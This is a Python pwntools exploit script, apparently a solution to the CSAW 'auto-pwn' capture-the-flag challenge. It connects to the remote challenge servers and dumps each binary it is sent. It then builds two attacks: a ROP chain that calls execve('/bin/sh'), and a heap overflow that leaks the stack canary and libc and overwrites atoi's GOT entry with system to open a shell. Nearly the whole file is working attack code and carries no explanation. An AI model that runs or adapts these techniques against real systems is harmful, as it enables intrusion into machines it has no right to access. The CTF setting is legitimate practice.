#!/usr/bin/python

from pwn import *
import sys

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
# context.log_level = "debug"
context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a, drop = True)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8,"\x00"))

def pwn(io, password, debug = False):
    sla("> ", password)
    if not debug:
        reu("on this box: \n")
        rl()
        f = io.recvuntil("-------------------------------------------------------------------\n")
        with open("out","w+") as fp:
            fp.write(f)
        os.system("cat out | xxd -r > bin && chmod +x bin")
    e = ELF('bin')
    reu("is at ")
    main = int("0x"+rl().strip(), 16)
    code_base = main - e.symbols['main']
    gadgets = dict()
    for i in ["rax", "rdi", "rsi", "rdx"]:
        gadgets[i] = code_base + int(os.popen('ROPgadget --binary ./bin | grep ": pop {} ; ret"'.format(i), 'r').read().split(" ")[0], 16)
    mov_qword = code_base +  int(os.popen('ROPgadget --binary ./bin | grep ": mov qword ptr"', 'r').read().split(" ")[0], 16)
    syscall = code_base +  int(os.popen('ROPgadget --binary ./bin | grep ": syscall"', 'r').read().split(" ")[0], 16)
    bss = code_base + 0x4000
    ropchain = "a"*9 + flat([
        gadgets["rdx"], bss,
        gadgets["rax"], "/bin/sh\x00",
        mov_qword,
        gadgets["rdi"], bss,
        gadgets["rsi"], 0,
        gadgets["rdx"], 0,
        gadgets["rax"], 0x3b,
        syscall
    ])
    sl(ropchain)
    sl("cat message.txt")
    reu("box! ")
    log.info(reu("password "))
    data = rl().strip("\n")
    log.info(data)
    return data

def pwn2(io, password, debug = False, final = False):
    sla("> ", password)
    if not debug:
        reu("on this box: \n")
        rl()
        f = io.recvuntil("-------------------------------------------------------------------\n")
        with open("out","w+") as fp:
            fp.write(f)
        os.system("cat out | xxd -r > bin && chmod +x bin")

    e = ELF('bin')
    libc = ELF("libc-2.24.so")

    canary = e.read(e.symbols['canary'], 16)

    canary_offset = int(os.popen('objdump -d -M intel bin | grep "rcx,\[rax"', 'r').read().split(" ")[-1].split("+")[-1][:-2], 16)
    data = os.popen('objdump -d -M intel bin | grep "\[rbx"', 'r').read().split("\n")[0].split(" ")[-1].split("[")[-1].split("]")[0]
    if "+" in data:
        ptr_offset = int(data.split("+")[-1], 16)
    else:
        ptr_offset = 0
    malloc_size = int(os.popen('objdump -d -M intel bin | grep -A 100 "mov    edi,0x40222a" | grep "mov    edi,0x"', 'r').read().split("\n")[4].split(",")[-1], 16)

    if malloc_size % 16 > 8:
        malloc_size = (malloc_size // 16 + 2) * 16
    else:
        malloc_size = (malloc_size // 16 + 1) * 16
    
    junk = "a"*0x30 + ("b"*canary_offset + canary).ljust(malloc_size, "b") + "c"*ptr_offset

    payload = junk + p64(e.got['puts'])
    
    sla(": ", "1")
    sla(": ", "1")
    sla("? ", str(len(payload) + 1))
    sa(": ", payload)

    sla(": ", "2")  
    sla(": ", "2")
    reu("reads: ")
    libc.address = uu64(rl().strip()) - libc.symbols['puts']

    payload = junk + p64(e.got['atoi'])

    sla(": ", "1")
    sla(": ", "1")
    sla("? ", str(len(payload) + 1))
    sa(": ", payload)

    sla(": ", "1")
    sla(": ", "2")
    sla("? ", "9")
    sa(": ", p64(libc.symbols['system']))

    sla(": ", "1")
    sla(": ", "/bin/sh\x00")

    if final:
        io.interactive()
    sl("cat message.txt")
    reu("box! ")
    log.info(reu("password "))
    data = rl().strip("\n")
    log.info(data)
    return data

if __name__ == "__main__":
    '''
    password = "8d16635db965bc4e0a97521e8105fad2"
    for i in range(20):
        io = remote('auto-pwn.chal.csaw.io', 11001+i)
        password = pwn(io, password)
        log.info("Finished {}".format(i))
        io.close()
    password = "13462b403d91edd8c8389517c1eca3ed"
    for i in range(19):
        io = remote('auto-pwn.chal.csaw.io', 11021+i)
        password = pwn2(io, password)
        log.info("Finished {}".format(i))
        io.close()
    '''
    password = "68bb1cbab9d0b8ea238ec4b64d171d15"
    io = remote('auto-pwn.chal.csaw.io', 11040)
    pwn2(io, password, final = True)